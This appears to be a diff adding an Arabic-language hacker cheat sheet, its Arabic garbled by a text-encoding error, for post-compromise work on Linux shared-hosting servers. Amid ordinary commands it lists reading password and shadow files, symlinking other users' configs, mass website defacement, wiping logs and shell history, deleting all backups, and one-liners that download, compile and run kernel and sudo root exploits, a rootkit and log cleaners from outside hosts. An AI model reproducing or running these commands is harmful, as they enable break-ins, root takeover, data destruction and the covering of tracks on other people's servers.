@@ -1,0 +1,306 @@
+
+ÇæÇãÑ ßÇáí áíäßÓ
+cat /etc/passwd | cut -d ":" -f1
+1- ÃãÑ ÅÙåÇÑ íæÒÑÇÊ ÇáãæÇŞÚ :
+ls -la /etc/valiases
+Çæ
+cat /etc/passwd
+Çæ
+ls /var/mail
+Çæ
+cat /etc/shadow
+Çæ
+cat /etc/domainalias
+ln -s / etc/passwd w
+íÓÍÈ áß Çáãáİ Èãáİ ÃÓãå w
+rm angel.php <------áÍĞİ ãáİ
+rm -r angel<------ áÍĞİ ãÌáÏ
+find angel.php <------áÚãá ÈÍË Úä ãáİ
+find *.php <------áÚãá ÈÍË Úä ÌãíÚ ÇáãáİÇÊ ÈåĞÇ ÇáÇãÊÏÇÏ
+-----------------------------------------
+ÃãÑ ÇáÊÃßÏ ãä ÕáÇÍíÉ ÓÍÈ ÇáãáİÇÊ Úáí ÇáÓíÑİÑ
+which xxxx <------ ÈÏá ÇáÚáÇãÇÊ ÈÃãÑ ÇáÓÍÈ
+xxxx = ÃãÑ ÇáÓÍÈ
+ÇæãÑ ÇáÓÍÈ
+wget
+curl -o
+get
+lynx -source
+------------------------------------
+åĞÇ ÇÇáÇãÑ Çáí ãÚí Íáæ íÎáíß ãÇ ÊãÔæÑ ãÔæÇÑ .... åĞÇ íØáÚáß ÇáãáİÇÊ Çáí ÏÇÎá ãÌáÏ boot
+ÊŞÏÑ ÊÛííÑ ãÌáÏ boot Çáì
+----------------------------------------------
+ßæÏ:
+cd /boot;ls -al
+etc << áİÍÕ ÈÚÖ ÇáãáİÇÊ æãäåÇ ŞÏ ÊÌÏ ËÛÑÉ confixx
+usr << áãÚÑİÉ ÈÑÇãÌ ÇáÓíÑİÑ
+opt < ÈÚÖ ÇáÓíÑİÑÇÊ ÊáŞÇå ÈÇáãÌáÏ ÇáÑÆíÓí ÈÚÖåÇ áÇ
+--------------------------------------------
+last -20 -a : ÚÑÖ ÂÎÑ 20 ÇÓã Êã ÊÓÌíá ÏÎæáåã
+ps -ax : ÚÑÖ ÇáÜ Processess
+lsmod : ÇáÜ modules ÇáãæÌæÏå İí ÇáßíÑäÇá
+uname -a : áÚÑÖ ãÚáæãÇÊ ÇáßÑäÇá
+ÇæÇãÑ ÈÓíØå
+mv : ÊÛííÑ ÇáÅÓã
+cp : äÓÎ ãáİ
+cp -R : äÓÎ ãÌáÏ
+ln : ÅäÔÇÁ ÑÇÈØ ( link ) áãáİ
+gerp : ÇáÈÍË ÏÇÎá ãáİ
+-----------------------------------
+áæ ÇÑÏÊ ãÚÑİÉ åá ÇáÈæÑÊ ãİÊæÍ11457 ÑÇÍ ÇØÈŞ ÇáÊÇáí :
+netstat -an|grep 11457
+---------------------------------------------
+ÇãÑ ááÊÇßÏ ãä æÌæÏ ãáİ
+ßæÏ:
+ls file
+Íáæ ÈÏá ãÇ ÊßÊÈ ls æíØáÚ áß ãáİÇÊ æÊÎÔ Úíæäß Úáì ÈÚÖ
+æíãßä ÊÓÊÎÏãå ááÊÇßÏ ãä æÌæÏå æãÚÑİå ÇáÊÕÑíÍ
+ßæÏ:
+ls -al file
+------------------------------------------------
+ÃæÇãÑ ÅÍÊÑÇİíå :
+1- ÅÙåÇÑ ÇáíæÒÑÇÊ ÈÔßá ãÑÊÈ :
+awk -F: '{ print $1 }' / etc/passwd | sort
+2- ãÚÑİÉ ÇáÈÑÇãÌ ÇáãÓÊÎÏãå ãä ŞÈá ÇáíæÒÑ æÇáÑææÊ ( ãä ÖãäåÇ ÇÓã ÈÑäÇãÌ ÇáÇİ Êí Èí )
+ps -o "%u : %U : %p : %a"
+3- ãÚáæãÇÊ ßÇãáå æÇÍÊÑÇİíå Úä Çá processess ãÚ ÊÍÏíÏ ÇáíæÒÑ ÇáãÓÊÎÏã ááÈÑæÓíÓ
+ps -eo pid,tt,user,fname,tmout,f,wchan
+4- Çá processess áíæÒÑ ãÚíä ¿ ( ÇÓÊÈÏá user İŞØ İí åĞÇ ÇáÃãÑ )
+ps -U user -u user -N
+5- ÇáíæÒÑÒ ÇáãÊÕáíä ÇáÂä
+users
+6- ÚÑÖ ÂÎÑ ÇáíæÒÑÒ Çááí ÏÎáæ :
+last
+7- áÌáÈ ãÚáæãÇÊ Úä ãÓÊÎÏã ãÚíä ( ÇÓÊÈÏá user İí åĞÇ ÇáÃãÑ )
+finger user
+8- ÇãÑ ãÚÑİÉ ÇÓãÇÁ ÇáíæÒÑÒ ÇáãÊÕáíä ÈÇáÓíÑİÑ .. æÇİÚÇáåã
+w
+9- ÚÑÖ ÇáÈæÑÊÇÊ ÇáãİÊæÍå
+netstat -lnp --ip
+-------------------------------------------
+touch angel.php íäÔÆ áß ãáİ Öãä ÇáãÌáÏ
+++g : ßæãÈíáÑ áá C++ æ C
+gcc : ßæãÈíáÑ áá C++ æ C
+grep : íÓÊÎÏã ááÈÍË Úä ÔÆ ÏÇÎá ãáİ
+gzip : áÖÛØ ãáİÇÊ
+gunzip : áÖÛØ ãáİÇÊ
+æÇá un áİß ÇáÖÛØ ÈÇáÇÓÊÚÇäå ãÚ ÇáÇæÇãÑ Çááí İæŞ ãËÇá : ungzip unzip
+haltsys : áÇÛáÇŞ ÇáäÙÇã
+cat : áÚÑÖ ãÍÊæì ÇßËÑ ãä ãáİ ãÚ ÈÚÖ
+cd : áÊÛíÑ ÇáÏáíá ÇáĞí ÇäÊ Úáíå
+chmod : áÊÛíÑ ÊÕÑíÍ ÏÎáæá ãáİ ãÚíä
+chown : áÊÛíÑ ãÇáß ãáİ ãÚíä
+clear : áãÓÍ ßá ÇáĞí Úáì ÇáÔÇÔÉ
+cmp : áãŞÇÑäÉ ãáİíä
+cp : áäÓÎ ÇáãáİÇÊ
+crypt : áÊÔİíÑ æ İß ÊÔİíÑ ÇáãáİÇÊ
+csplit : áÊŞÓíã Çáãáİ Çáì ÚÏÉ ãáİÇÊ
+cu : áØáÈ ÊÑíãäÇá íæäßÓ ÇÎÑ
+whoami íŞæá áß ãä ÇäÊ (íÚäí ãä ÇäÇ ) íŞæá áß root Çæ ãÓÊÎÏã xxx
+rm : áãÓÍ ãáİÇÊ Çæ ãÌáÏÇÊ ( ÎÇáíå )
+rmdir : áãÓÍ ãÌáÏ ( ÎÇáí )
+æİí ÍÇá ßäÊ ÈÇáÊÑãäÇá ÇÖÛØ Úáì ÒÑ ÇáÊÇÈ Tap íÚÑÖ áß ßá ÇæÇãÑ ÇááíäßÓ
+æãËáÇğ Çí ÇãÑ ÊÍÈ ÊÚÑİ Ôæ åææÇ İŞØ ÇßÊÈ ÇáÃãÑ æÈÚÏåÇ åíáÈ :
+ãËÇá rm --help
+--------------------------------------------------
+ÃæÇãÑ ÑÇÆÚå :
+áãÚÑİÉ ÌãíÚ ãáİÇÊ ÇÓã ãÓÊÎÏã ãÚíä ( ÇÓÊÈÏá john )
+find /home -user john
+áãÚÑİÉ ÇáãáİÇÊ ÇááÊí Êã ÊÚÏíáåÇ İí ÎáÇá ÇáÜ 24 ÓÇÚå ( ÃãÑ ãåã )
+find $HOME -mtime 0
+áãÚÑİÉ ÇáãÓÇÍå ÇáãÓÊÎÏãå
+df -h
+áãÚÑİÉ ÇáãÓÇÍå ÇáãÊÈŞíå
+du
+-----------------------------------------
+æåĞí ãÌãæÚÉ ãä ÇáÃæÇãÑ ÇáÈÓíØÉ
+ls -m
+íÙåÑ ÇáãáİÇÊ ãÚ ÊİÑíŞåã ÈİæÇÕá ÈÏáÇ ãä ÊİÑíŞåã ÈÎÇäÇÊ
+ls -t
+íÙåÑ ÇáãáİÇÊ ÍÓÈ ÊæÇÑíÎ ÅäÔÇÆåÇ íÚäí ãä ÇáÌÏíÏ Åáì ÇáŞÏíã
+ls -lu
+íÙåÑ ÇáãáİÇÊ ÍÓÈ ÂÎÑ ÊÇÑíÎ ÒíÇÑÉ áåĞå ÇáãáİÇÊ (ãÚ ÊÈííä åĞÇ ÇáÊÇÑíÎ)
+ls -F
+íÙåÑ ÇáãáİÇÊ ÈÃäæÇÚåÇ ÍíË :
+ÇáãáİÇÊ ÇáãÓÈæŞÉ È / ÚÈÇÑÉ Úä ãÌáÏÇÊ
+ÇáãáİÇÊ ÇáãÓÈæŞÉ È * ÚÈÇÑÉ Úä ãáİÇÊ ÊäİíĞíÉ
+ÇáãáİÇÊ ÇáãÓÈæŞÉ È @ ÚÈÇÑÉ Úä ÑæÇÈØ
+ls -S
+íÙåÑ ÇáãáİÇÊ ÊÓáÓáíÇ ãä ÇáÃßÈÑ Åáì ÇáÃÕÛÑ
+ls -X
+íÙåÑ ÇáãáİÇÊ æíÑÊÈåÇ ÍÓÈ ÇãÊÏÇÏåÇ
+ls -r
+íÙåÑ ÇáãáİÇÊ ãÑÊÈÉ ÈÇáãŞáæÈ (íÚäí ãä z Ëã y Ëã x ....)
+cp
+áäÓÎ ãáİ Ãæ ãÌáÏ
+mkdir
+áÅäÔÇÁ ãÌáÏ
+mv
+áÊÍæíá ãáİ ãä ãÌáÏ Åáì ãÌáÏ Ãæ ÅÚÇÏÉ ÊÓãíÊå
+(ãËáÇ
+mv angel gnom
+ÑÇÍ íÚíÏ ÊÓãíÊ ÇáãÌáÏ angel Åáì gnom
+Ãæ
+mv angel.php /ho me/hackteach/publi c_htm l/cc/test
+ÑÇÍ íÍæá Çáãáİ angel.php ãä ÇáãÌáÏ Åáí åæ İíå Åáì ÇáãÌáÏ ÇáÌÏíÏ test)
+---------------------------------------
+ln -sf / home / user / public_html / vb / in clude s / c onfig . php conf.txt
+ÑÇÍ íÌíÈ áß äÓÎÜÉ ãä ãáİ ÇáßæäİŞ ÊÈÚ ÇáíæÒÑ ÇáãÍÏÏ İí Çáãáİ ÇáÌÏíÏ conf.txt
+ÈÇáÚÑÈí ,, ÇáÃãÑ åĞÇ åæ ÍŞ ÇáÓã áíäß ,, symLink
+---------------------------------------
+ÃãÑ áãÚÑİÉ ÇáíæÒÑ Çááí ãÓÊåáß ÃßÈÑ ãÓÇÍå :
+du -s / home | sort -rn
+( ÈÏæä ãÓÇİå ÈÚÏ / æ home )
+-----------------------------------
+ÇáäÓÎ æÇááÕŞ ÈåÇáØÑíŞÉ
+c p /ho me/hi.t xt /ho me/jack
+Ãæ ÇáÚßÓ
+----------------------------
+áÚãá ãÇÓ ÏíİÇÓ ÈÚÏ ÇÎĞ ÇáÑæÊ
+ßæÏ PHP:
+find / -name "index.*" -exec cp /t mp/index.htm
+----------------------------------------------
+ÃãÑ ÅÙåÇÑ ÈÇÓæÑÏÇÊ ÇáÓí ÈÇäá ( İí ÍÇáÉ ßäÊ ÑæÊ ) :
+İí ÃæÇãÑ ßËíÑå .. ÈÚÖåÇ :
+find / -name service.pwd
+Çæ
+cat / home/*/public_html/_vti_pvt/service.pwd
+æ
+cat / var/cpanel/accounting.log
+( áÇÊäÓì ÊÍĞİ ÇáãÓÇİÇÊ ŞÈá var æ home )
+--------------------------------------------
+1- ÍĞİ ãáİÇÊ ÇááæŞæ
+rm -rf / tmp/logs
+rm -rf $HISTFILE
+rm -rf / root/.ksh_history
+rm -rf / root/.bash_history
+rm -rf / root/.ksh_history
+rm -rf / root/.bash_logout
+rm -rf / usr/local/apache/logs
+rm -rf / usr/local/apache/log
+rm -rf / var/apache/logs
+rm -rf / var/apache/log
+rm -rf / var/run/utmp
+rm -rf / var/logs
+rm -rf / var/log
+rm -rf / var/adm
+rm -rf / etc/wtmp
+rm -rf / etc/utmp
+find / -name *.bash_history -exec rm -rf {} \;
+find / -name *.bash_logout -exec rm -rf {} \;
+find / -name "log*" -exec rm -rf {} \;
+find / -name *.log -exec rm -rf {} \;
+-------------------------------------------------
+2- ÃãÑ ÊÚÏíá ãáİÇÊ ÇááæŞæ ( ÅÎİÇÆåÇ .. Âãä )
+cat / dev/null > / var/log/kdebug
+cat / dev/null > / var/log/kernel
+cat / dev/null > / var/log/maillog
+cat / dev/null > / var/log/messages
+cat / dev/null > / var/log/secure
+cat / dev/null > / var/log/svclog
+cat / dev/null > / var/log/tcdebuglog
+cat / dev/null > / var/log/tclient
+cat / dev/null > / var/log/tivoLog.prv
+cat / dev/null > / var/log/tivoLog.pub
+cat / dev/null > / var/log/tivoweb.log
+cat / dev/null > / var/log/tvdebuglog
+cat / dev/null > / var/log/tverr
+cat / dev/null > / var/log/tvlog
+3- ÃãÑ ŞÑÇÆÉ ãáİ ÇáßæäİíÌ Úáì ÇáÓíÑİÑ
+cat / usr/local/apache/conf/httpd.conf
+4- ÃãÑ ÚÑÖ ÇáãáİÇÊ Suid ( ãáİÇÊ ãä ŞÈá ÇáÑæÊ áßä íÓÊØíÚ ÇáíæÒÑ ÊÔÛíáåÇ )
+find / -type f -perm -04000 -ls
+-------------------------------------------------
+5- ÃãÑ ÚÑÖ ÇáãáİÇÊ Sgid ( ãáİÇÊ ãä ŞÈá ÇáÑæÊ áßä ÊÓÊØíÚ ÇáãÌãæÚå ÊÔÛíáåÇ )
+find / -type f -perm -02000 -ls
+6- ÃæÇãÑ ÚÑÖ ÇáãÌáÏÇÊ ÇáãÕÑÍ áåÇ ÊÕÑíÍ 777
+find / -perm -2 -ls
+find / -type d -perm 0777 | xargs ls -alld
+find / -type d -pem -2 -ls
+7- ÃãÑ ÍĞİ ÌãíÚ ÇáÈÇß ÂÈ ÇáãæÌæÏå Úáì ÇáÓíÑİÑ
+find / -name "cpbackup*" -exec rm {} ;
+find / -name "backup*" -exec rm {} ;
+8- ÃãÑ ÅÓÊÈÏÇá ÌãíÚ ÇáÅäÏßÓÇÊ Åáì ÇáÅäÏßÓ ÇáãæÌæÏ Úáì ÇáãÓÇÑ ÇáÍÇáí
+find / -name "index.*" -exec cp index.htm {} ;
+find / -name "default.*" -exec cp index.htm {} ;
+9- ÃãÑ ÊÚÏíá ÕáÇÍíÇÊ ÇáÅäÏßÓÇÊ Åáì nobody ( áßí áÇ íÔß ÇáíæÒÑ )
+find / -name "index.*" -exec chown 99 index.html {} ;
+find / -name "default.*" -exec chown 99 index.html {} ;
+10- ÃãÑ ÚÑÖ System log
+cat / etc/syslog.conf
+11- ÃãÑ ÚÑÖ ãÚáæãÇÊ Úä ÇáĞÇßÑå
+cat / proc/meminfo
+12- ÃãÑ ÊÚÏíá ÏæÇá php æÇáÓíİ ãæÏ æÛíÑåÇ
+pico / usr/local/lib/php.ini
+13- ÃãÑ ÚÑÖ ÇáÈæÑÊÇÊ ÇáãİÊæÍå
+netstat -atup | grep IST
+14- ÃãÑ ÚÑÖ ÂÎÑ ÅÊÕÇá
+lastlog
+15- ÃãÑ ÚÑÖ ÇáíæÒÑÇÊ ÇáãÊÕáå
+w
+--------------------------------------------------
+16- ÃãÑ áãÚÑİÉ ÅÕÏÇÑ ÇáßíÑäÇá
+dpkg --list | grep linux-image
+rpm -q kernel : kernel-2.6.18-53.1.4.el5
+uname -s : SunOS
+uname -r : 2.6.22-14-EL5
+uname -mrsn : Linux s.server.com 2.6.18-53.1.4.el5 x86_64
+cat / proc/version : Linux version 2.6.18-53.1.4.el5 (b@redhat.com) (gcc version 4.1.2 20070626 (Red Hat 4.1.2-14)) #1 SMP Wed Nov 14 1027 EST 2007
+17- ÃãÑ ÅíŞÇİ process ãÚíä Úä ÇáÚãá
+kill -9 PID
+kill PID
+ãÚ ÅÓÊÈÏÇá PID áÑŞã ÇáÈÑæÓíÓ .. ÊÓÊØíÚ ãÚÑİÊå Úä ØÑíŞ ÇáÃãÑ
+ps ux
+ps aux
+top
+18- ÃãÑ ÚÑÖ ÇáÃæÇãÑ ( Çæ ÈÇáÃÕÍ ÇáãáİÇÊ ÇáÊäİíĞíå ) ÇááÊí ÚáíåÇ Suid ( íÓÊØíÚ ÇáíæÒÑ ÊÔÛíáåÇ )
+find / bin / usr/bin / usr/local/bin / sbin / usr/sbin / usr/local/sbin -perm -4000 2> / dev/null
+19- ÃãÑ ÚÑÖ ÇáíæÒÑÇÊ ÇááÊí áÇ ÊÍÊæí Úáì ÈÇÓæÑÏ
+cut -d: -f1,2,3 / etc/passwd | grep
+---------------------------------------------------------------
+20- ÃãÑ ÚÑÖ ÇáãáİÇÊ ÇááÊí ÊÑíÏ ÇáßÊÇÈå ÚáíåÇ İí ãÌáÏ etc
+find / etc/ -type f -perm -o+w 2> / dev/null
+21- ÃãÑ ÚÑÖ ÃæÇãÑ ÇáÓÍÈ ÇáãİÚáå ßÜ wget
+which wget curl w3m lynx
+22- ÃãÑ ÚÑÖ ãÚáæãÇÊ Úä ÇáãÚÇáÌ CPUINFO
+cat / proc/version / proc/cpuinfo
+23- ÃãÑ ÚÑÖ ãÓÇÍÇÊ ÇáåÇÑÏÓß
+du
+( ãáÇÍÙå : ÊÓÊØíÚ ÅÓÊÎÏÇãå ãÚ option ÇÎÑì .. áÇÍÙ ÇáÃæÇãÑ ÇáÊÇáíå )
+du -s / home/user | sort -rn
+df -Th
+24- ÃãÑ ÇáÊÃßÏ ãä æÌæÏ ÇáãÊÑÌã gcc
+locate gcc
+25- ÃãÑ ÅÓÊÎÏÇã Wipelogs ( ááÊÚÏíá Úáì ÇáæŞæ .. Ããä )
+wget No Results Found Packet Storm | gcc zap2.c -o zap2 | ./zap2
+26- ÃãÑ ÊäİíĞ ÈÚÖ ÇáåÌãÇÊ Úáì ÇáßíÑäÇá
+wget http://ftp.powernet.com.tr/supermail/debug/k3| ./k3 1 | ./k3 2 | ./k3 3 | ./k3 4 | ./k3 5
+27- ÅÓÊÎÏÇã ËÛÑÉ stack overflow Úä ØÑíŞ sudo
+wget http://precision-gaming.com/sudo.c | gcc sudo.c -o sudosploit | ./sudosploit
+28- ÃãÑ ÊËÈíÊ ÑæÊ ßÊ áÅÕÏÇÑ 2.6
+wget twofaced.org | gcc linux2-6-all.c -o linuxkernel | ./linuxkernel
+29- ÃãÑ ÇÓÊÎÏÇã ÓßÑÈÊ Mig LogCleaner
+wget twofaced.org | gcc -DLINUX -WALL mig-logcleaner.c -o migl | ./migl -u root 0
+30- ÃãÑ áãÚÑİÉ ÇáãáİÇÊ æÇáãÌáÏÇÊ ÇááÊí Êã ÊÚÏíáåÇ İí ÎáÇá X íæã
+find / -mtime x
+( ãáÇÍÙå : ÇÓÊÈÏá time Åáì min ááÈÍË İí ÇáÏŞÇÆŞ .. áíÕáÍ mmin )
+31- ÃãÑ áãÚÑİÉ ÇáãáİÇÊ æÇáãÌáÏÇÊ ÇááÊí Êã ÊÚÏíá ÎÕÇÆÕåÇ ( ßÜ Çáãáßíå ) İí ÎáÇá X íæã
+find / -ctime x
+32- ááÈÍË Úä ÇáãáİÇÊ ÇááÊí ãÇáßåÇ root áßä íÓÊØíÚ ÇáíæÒÑ ÊäİíĞåÇ
+find / -perm +4000 -user root
+33- ááÈÍË Úä ÇáãáİÇÊ ÇááÊí ãÇáßåÇ root áßä íÓÊØíÚ ÇáíæÒÑ ÇáßÊÇÈå ÚáíåÇ
+find / -perm +002 -user root
+34- ááÈÍË Úä ÇáãáİÇÊ ÇááÊí áíÓ áÏíåÇ ãÇáß
+find / -nouser
+35- ááÈÍË Úä ÇáãáİÇÊ ÇááÊí ãÇáßåÇ åæ ÇáíæÒÑ root
+find / -user root
+36- ãä ÇáÃæÇãÑ ÇáÊİÕíáíå áÜ find
+find / -name "*.txt" -size +10k -user root -not -perm +o=r -exec chmod o+r {} \;
+ÔÑÍ ÇáÃãÑ :
+ÇÈÍË İí ÌãíÚ ÇáãÌáÏÇÊ .. Úä Çí ãáİ äÕí ÇãÊÏÇÏå txt
+æÍÌãå ÃßËÑ ãä 10 ßíáæ ÈÇíÊ .. æÕÇÍÈå ÇáíæÒÑ root
+æÛíÑ ŞÇÈáå ááŞÑÇÁå ãä Çí íæÒÑ ÇÎÑ ãÇÚÏÇ ãÇáßåÇ ÇáÃÕáí
+íÓÊØíÚ ÕÇÍÈåÇ ŞÑÇÆÊåÇ ææíÓÊØíÚ ÊäİíĞåÇ ( execution ) ( æÑãÒå -r-xr--r-- )
+----------------------------------------
+37- æÊÓÊØíÚ ÅÓÊÎÏÇã ÃãÑ find ÈÔßá ÂÎÑ .. ãËá : find / -type f \( -perm -04000 -o -perm -02000 \) \-exec ls -lg {} \; ÔÑÍ ÇáÃãÑ : ÚÑÖ ÌãíÚ ÇáãáİÇÊ İŞØ .. ÇááÊí áÏíåÇ ÎÇÕíÊí SetUID æ SetGID ÈÔßá ãİÕá
+http://ftp.powernet.com.tr/supermail/debug/k3
